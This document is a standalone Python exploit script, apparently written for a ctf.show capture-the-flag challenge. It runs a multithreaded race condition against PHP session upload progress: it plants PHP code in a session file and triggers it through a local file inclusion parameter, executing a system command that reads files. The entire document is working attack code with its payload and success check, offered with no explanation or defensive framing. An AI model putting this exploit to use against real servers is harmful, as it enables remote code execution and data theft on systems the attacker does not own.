import threading
import requests
import io

thread_num = 100#线程数
thread_list=[]
stop_threads = False

def run(s):
    global stop_threads
    while True:
        if stop_threads:
            break
        f = io.BytesIO(b'a' * 1024 * 50)#越大越容易成功
        url='http://a8246e14-eb89-42f9-9445-549f86ba5b1c.challenge.ctf.show:8080/?file=/tmp/sess_hack'
        headers={'Cookie': 'PHPSESSID=hack',}
        data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php system('tac /c*');echo 'RE0H';?>"}#Payload
        files={"file":('a.txt', f)}

        r=s.post(url,headers=headers,data=data,files=files)
        if 'RE0H' in r.text:
            print(r.text)
            stop_threads = True
            exit(0)
             

if __name__ == '__main__':
    with requests.session() as s:
        while thread_num:
            t = threading.Thread(target=run, args=(s, ))
            thread_num-=1
            t.start()
            thread_list.append(t)
        
        for t in thread_list:
            t.join()
